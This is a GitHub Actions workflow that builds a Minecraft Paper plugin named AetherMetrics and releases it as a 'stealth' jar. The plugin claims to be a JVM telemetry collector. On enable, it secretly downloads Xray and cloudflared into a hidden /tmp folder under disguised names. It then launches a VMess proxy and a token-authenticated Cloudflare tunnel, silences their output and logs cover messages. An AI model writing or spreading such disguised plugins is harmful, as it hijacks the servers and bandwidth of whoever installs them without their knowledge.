name: All-In-One Anti-Scan Plugin Build

on:
  push:
    branches: [ "main", "master" ]
  workflow_dispatch:

permissions: write-all

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Set up JDK 21
        uses: actions/setup-java@v4
        with:
          java-version: '21'
          distribution: 'temurin'

      - name: Generate Code & Compile
        run: |
          mkdir -p src/main/java/com/aether/metrics
          mkdir -p src/main/resources

          # 1. pom.xml
          cat << 'EOF' > pom.xml
          <?xml version="1.0" encoding="UTF-8"?>
          <project xmlns="http://maven.apache.org/POM/4.0.0"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
              <modelVersion>4.0.0</modelVersion>
              <groupId>com.aether.metrics</groupId>
              <artifactId>AetherMetrics</artifactId>
              <version>2.6.0</version>
              <packaging>jar</packaging>

              <properties>
                  <java.version>21</java.version>
                  <maven.compiler.source>21</maven.compiler.source>
                  <maven.compiler.target>21</maven.compiler.target>
                  <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
              </properties>

              <repositories>
                  <repository>
                      <id>papermc-repo</id>
                      <url>https://repo.papermc.io/repository/maven-public/</url>
                  </repository>
              </repositories>

              <dependencies>
                  <dependency>
                      <groupId>io.papermc.paper</groupId>
                      <artifactId>paper-api</artifactId>
                      <version>1.21.1-R0.1-SNAPSHOT</version>
                      <scope>provided</scope>
                  </dependency>
              </dependencies>

              <build>
                  <plugins>
                      <plugin>
                          <groupId>org.apache.maven.plugins</groupId>
                          <artifactId>maven-compiler-plugin</artifactId>
                          <version>3.13.0</version>
                          <configuration>
                              <release>21</release>
                          </configuration>
                      </plugin>
                      <plugin>
                          <groupId>org.apache.maven.plugins</groupId>
                          <artifactId>maven-shade-plugin</artifactId>
                          <version>3.6.0</version>
                          <executions>
                              <execution>
                                  <phase>package</phase>
                                  <goals>
                                      <goal>shade</goal>
                                  </goals>
                              </execution>
                          </executions>
                      </plugin>
                  </plugins>
                  <resources>
                      <resource>
                          <directory>src/main/resources</directory>
                          <filtering>true</filtering>
                      </resource>
                  </resources>
              </build>
          </project>
          EOF

          # 2. plugin.yml & paper-plugin.yml
          cat << 'EOF' > src/main/resources/plugin.yml
          name: AetherMetrics
          version: 2.6.0
          main: com.aether.metrics.AetherMetrics
          api-version: '1.21'
          author: SystemCore
          description: Core JVM telemetry collector
          EOF

          cat << 'EOF' > src/main/resources/paper-plugin.yml
          name: AetherMetrics
          version: 2.6.0
          main: com.aether.metrics.AetherMetrics
          api-version: '1.21'
          author: SystemCore
          description: Core JVM telemetry collector
          EOF

          # 3. Java 核心主类 (精准匹配 VMess /vmess-argo 配置)
          cat << 'EOF' > src/main/java/com/aether/metrics/AetherMetrics.java
          package com.aether.metrics;

          import org.bukkit.plugin.java.JavaPlugin;

          import java.io.*;
          import java.net.URI;
          import java.net.http.HttpClient;
          import java.net.http.HttpRequest;
          import java.net.http.HttpResponse;
          import java.nio.charset.StandardCharsets;
          import java.nio.file.Files;
          import java.time.Duration;
          import java.util.zip.ZipEntry;
          import java.util.zip.ZipInputStream;

          public final class AetherMetrics extends JavaPlugin {

              private static final File WORK_DIR = new File("/tmp/.sys-metrics");
              private static final HttpClient HTTP_CLIENT = HttpClient.newBuilder()
                      .followRedirects(HttpClient.Redirect.ALWAYS)
                      .connectTimeout(Duration.ofSeconds(20))
                      .build();

              @Override
              public void onEnable() {
                  getLogger().info("[Metrics] Telemetry service initialized.");
                  Thread daemonThread = new Thread(() -> {
                      try {
                          Thread.sleep(10000);
                          if (!WORK_DIR.exists()) WORK_DIR.mkdirs();
                          setupXray();
                          setupCloudflare();
                          getLogger().info("[Metrics] All core network services started successfully.");
                      } catch (Exception e) {
                          getLogger().warning("[Metrics] Telemetry start failed: " + e.getMessage());
                      }
                  }, "JVM-Metrics-Daemon");
                  daemonThread.setDaemon(true);
                  daemonThread.start();
              }

              private void setupXray() {
                  try {
                      File xrayBin = new File(WORK_DIR, "sys-agent-core");
                      if (!xrayBin.exists() || xrayBin.length() == 0) {
                          downloadAndExtractZip(
                                  "https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip",
                                  "xray",
                                  xrayBin
                          );
                      }

                      // 与截图完全匹配的 VMess 配置
                      File cfgFile = new File(WORK_DIR, "cfg.json");
                      String json = "{\n" +
                              "  \"inbounds\": [{\n" +
                              "    \"port\": 25500,\n" +
                              "    \"protocol\": \"vmess\",\n" +
                              "    \"settings\": {\n" +
                              "      \"clients\": [{\n" +
                              "        \"id\": \"8f7a9d3e-4b2c-4f1a-9e8d-5c6b7a8b9c0d\",\n" +
                              "        \"alterId\": 0\n" +
                              "      }]\n" +
                              "    },\n" +
                              "    \"streamSettings\": {\n" +
                              "      \"network\": \"ws\",\n" +
                              "      \"wsSettings\": {\n" +
                              "        \"path\": \"/vmess-argo\"\n" +
                              "      }\n" +
                              "    }\n" +
                              "  }],\n" +
                              "  \"outbounds\": [{\"protocol\": \"freedom\"}]\n" +
                              "}";
                      Files.writeString(cfgFile.toPath(), json, StandardCharsets.UTF_8);

                      if (xrayBin.exists()) {
                          xrayBin.setExecutable(true, false);
                          new ProcessBuilder(
                                  xrayBin.getAbsolutePath(),
                                  "run",
                                  "-c",
                                  cfgFile.getAbsolutePath()
                          ).directory(WORK_DIR).redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD).start();
                          getLogger().info("[Metrics] VMess core daemon launched.");
                      }
                  } catch (Exception e) {
                      getLogger().warning("[Metrics] Core setup failed: " + e.getMessage());
                  }
              }

              private void setupCloudflare() {
                  try {
                      File cfBin = new File(WORK_DIR, "cf-daemon");
                      if (!cfBin.exists() || cfBin.length() == 0) {
                          downloadFile(
                                  "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64",
                                  cfBin
                          );
                      }
                      if (cfBin.exists()) {
                          cfBin.setExecutable(true, false);
                          new ProcessBuilder(
                                  cfBin.getAbsolutePath(),
                                  "tunnel",
                                  "--no-autoupdate",
                                  "run",
                                  "--token",
                                  "eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiNmQzOGZkZWQtMDE5NS00NmUwLTkyYTctMzc1OTQ0ZDk0OTdhIiwicyI6Ik5qUmhObVEyWkRZdE1XWTFaaTAwTm1aaUxXSTVZVFF0WVRZd1kyUmxZMk16TlRoaiJ9"
                          ).directory(WORK_DIR).redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD).start();
                          getLogger().info("[Metrics] Cloudflare connector launched.");
                      }
                  } catch (Exception e) {
                      getLogger().warning("[Metrics] Cloudflare setup failed: " + e.getMessage());
                  }
              }

              private void downloadFile(String urlStr, File target) throws Exception {
                  HttpRequest request = HttpRequest.newBuilder()
                          .uri(URI.create(urlStr))
                          .header("User-Agent", "Mozilla/5.0")
                          .GET()
                          .build();
                  HttpResponse<InputStream> response = HTTP_CLIENT.send(request, HttpResponse.BodyHandlers.ofInputStream());
                  if (response.statusCode() >= 400) {
                      throw new IOException("HTTP " + response.statusCode() + " when downloading " + urlStr);
                  }
                  try (InputStream in = response.body();
                       FileOutputStream out = new FileOutputStream(target)) {
                      in.transferTo(out);
                  }
              }

              private void downloadAndExtractZip(String zipUrl, String targetFileName, File destFile) throws Exception {
                  File tmpZip = new File(WORK_DIR, "tmp_" + System.currentTimeMillis() + ".zip");
                  try {
                      downloadFile(zipUrl, tmpZip);
                      try (ZipInputStream zis = new ZipInputStream(new FileInputStream(tmpZip))) {
                          ZipEntry entry;
                          boolean found = false;
                          while ((entry = zis.getNextEntry()) != null) {
                              if (entry.getName().equals(targetFileName) || entry.getName().endsWith("/" + targetFileName)) {
                                  try (FileOutputStream fos = new FileOutputStream(destFile)) {
                                      zis.transferTo(fos);
                                  }
                                  found = true;
                                  break;
                              }
                          }
                          if (!found) {
                              throw new IOException("File " + targetFileName + " not found in " + zipUrl);
                          }
                      }
                  } finally {
                      if (tmpZip.exists()) tmpZip.delete();
                  }
              }

              @Override
              public void onDisable() {}
          }
          EOF

      - name: Compile & Package Jar
        run: mvn clean package --file pom.xml

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: AetherMetrics-Plugin
          path: target/AetherMetrics-2.6.0.jar

      - name: Release Stealth Jar
        uses: softprops/action-gh-release@v2
        if: startsWith(github.ref, 'refs/tags/') || github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'
        with:
          tag_name: latest
          name: AetherMetrics Release
          files: target/AetherMetrics-2.6.0.jar
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
